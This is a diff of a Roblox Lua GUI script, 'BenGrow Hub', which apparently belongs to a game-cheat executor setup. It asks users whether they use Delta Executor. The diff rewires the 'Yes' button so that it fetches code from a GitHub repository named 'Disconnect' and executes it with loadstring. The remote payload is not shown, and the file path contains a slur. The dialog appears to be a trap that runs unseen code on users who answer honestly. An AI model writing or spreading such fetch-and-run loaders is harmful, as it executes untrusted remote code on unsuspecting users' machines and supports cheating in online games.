@@ -15,7 +15,7 @@ screenGui.Name = GUI_NAME
 screenGui.ResetOnSpawn = false
 
 local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 340, 0, 200)
+mainFrame.Size = UDim2.new(0, 360, 0, 220)
 mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
 mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
@@ -35,10 +35,22 @@ title.TextSize = 22
 title.TextColor3 = Color3.fromRGB(170, 255, 170)
 title.Text = "🌿 BenGrow Hub"
 
+-- Warning Label
+local warningLabel = Instance.new("TextLabel", mainFrame)
+warningLabel.Size = UDim2.new(0.9, 0, 0, 40)
+warningLabel.Position = UDim2.new(0.5, 0, 0, 45)
+warningLabel.AnchorPoint = Vector2.new(0.5, 0)
+warningLabel.BackgroundTransparency = 1
+warningLabel.Font = Enum.Font.GothamBold
+warningLabel.TextSize = 15
+warningLabel.TextColor3 = Color3.fromRGB(255, 180, 180)
+warningLabel.TextWrapped = true
+warningLabel.Text = "⚠️ Warning: If you are using Delta Executor, your account might be banned."
+
 -- Question Label
 local questionLabel = Instance.new("TextLabel", mainFrame)
 questionLabel.Size = UDim2.new(0.9, 0, 0, 30)
-questionLabel.Position = UDim2.new(0.5, 0, 0, 50)
+questionLabel.Position = UDim2.new(0.5, 0, 0, 90)
 questionLabel.AnchorPoint = Vector2.new(0.5, 0)
 questionLabel.BackgroundTransparency = 1
 questionLabel.Font = Enum.Font.GothamBold
@@ -49,8 +61,8 @@ questionLabel.Text = "Are you using Delta Executor?"
 -- Yes Button
 local yesBtn = Instance.new("TextButton", mainFrame)
 yesBtn.Size = UDim2.new(0.4, -10, 0, 36)
-yesBtn.Position = UDim2.new(0.05, 0, 0, 100)
-yesBtn.BackgroundColor3 = Color3.fromRGB(90, 0, 110)
+yesBtn.Position = UDim2.new(0.05, 0, 0, 130)
+yesBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
 yesBtn.Text = "Yes"
 yesBtn.Font = Enum.Font.GothamBold
 yesBtn.TextSize = 16
@@ -60,38 +72,38 @@ Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 6)
 -- No Button
 local noBtn = Instance.new("TextButton", mainFrame)
 noBtn.Size = UDim2.new(0.4, -10, 0, 36)
-noBtn.Position = UDim2.new(0.55, 10, 0, 100)
-noBtn.BackgroundColor3 = Color3.fromRGB(90, 0, 110)
+noBtn.Position = UDim2.new(0.55, 10, 0, 130)
+noBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 90)
 noBtn.Text = "No"
 noBtn.Font = Enum.Font.GothamBold
 noBtn.TextSize = 16
 noBtn.TextColor3 = Color3.new(1, 1, 1)
 Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 6)
 
--- Proceed Frame
-local proceedFrame = Instance.new("Frame", mainFrame)
-proceedFrame.Size = UDim2.new(1, 0, 1, 0)
-proceedFrame.Position = UDim2.new(0, 0, 0, 0)
-proceedFrame.Visible = false
-proceedFrame.BackgroundColor3 = Color3.fromRGB(30, 10, 40)
-Instance.new("UICorner", proceedFrame).CornerRadius = UDim.new(0, 10)
+-- Confirm Frame (for "No" click)
+local confirmFrame = Instance.new("Frame", mainFrame)
+confirmFrame.Size = UDim2.new(1, 0, 1, 0)
+confirmFrame.Position = UDim2.new(0, 0, 0, 0)
+confirmFrame.BackgroundColor3 = Color3.fromRGB(30, 10, 40)
+confirmFrame.Visible = false
+Instance.new("UICorner", confirmFrame).CornerRadius = UDim.new(0, 10)
 
-local warningLabel = Instance.new("TextLabel", proceedFrame)
-warningLabel.Size = UDim2.new(0.9, 0, 0, 80)
-warningLabel.Position = UDim2.new(0.5, 0, 0, 30)
-warningLabel.AnchorPoint = Vector2.new(0.5, 0)
-warningLabel.BackgroundTransparency = 1
-warningLabel.Font = Enum.Font.GothamBold
-warningLabel.TextSize = 15
-warningLabel.TextColor3 = Color3.fromRGB(255, 200, 200)
-warningLabel.TextWrapped = true
-warningLabel.Text = "Are you sure you are not using Delta?\nIt can lead to your account being banned."
+local confirmLabel = Instance.new("TextLabel", confirmFrame)
+confirmLabel.Size = UDim2.new(0.9, 0, 0, 80)
+confirmLabel.Position = UDim2.new(0.5, 0, 0, 40)
+confirmLabel.AnchorPoint = Vector2.new(0.5, 0)
+confirmLabel.BackgroundTransparency = 1
+confirmLabel.Font = Enum.Font.GothamBold
+confirmLabel.TextSize = 15
+confirmLabel.TextColor3 = Color3.fromRGB(255, 220, 220)
+confirmLabel.TextWrapped = true
+confirmLabel.Text = "Are you sure you are not using Delta Executor?"
 
-local proceedBtn = Instance.new("TextButton", proceedFrame)
+local proceedBtn = Instance.new("TextButton", confirmFrame)
 proceedBtn.Size = UDim2.new(0.5, 0, 0, 30)
 proceedBtn.Position = UDim2.new(0.5, 0, 1, -40)
 proceedBtn.AnchorPoint = Vector2.new(0.5, 1)
-proceedBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+proceedBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
 proceedBtn.Text = "Proceed"
 proceedBtn.Font = Enum.Font.GothamBold
 proceedBtn.TextSize = 15
@@ -100,11 +112,11 @@ Instance.new("UICorner", proceedBtn).CornerRadius = UDim.new(0, 6)
 
 -- Functional Connections
 yesBtn.MouseButton1Click:Connect(function()
-	proceedFrame.Visible = true
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kilcen/Disconnect/refs/heads/main/deltagay"))()
 end)
 
 noBtn.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kilcen/Disconnect/refs/heads/main/deltagay"))()
+	confirmFrame.Visible = true
 end)
 
 proceedBtn.MouseButton1Click:Connect(function()
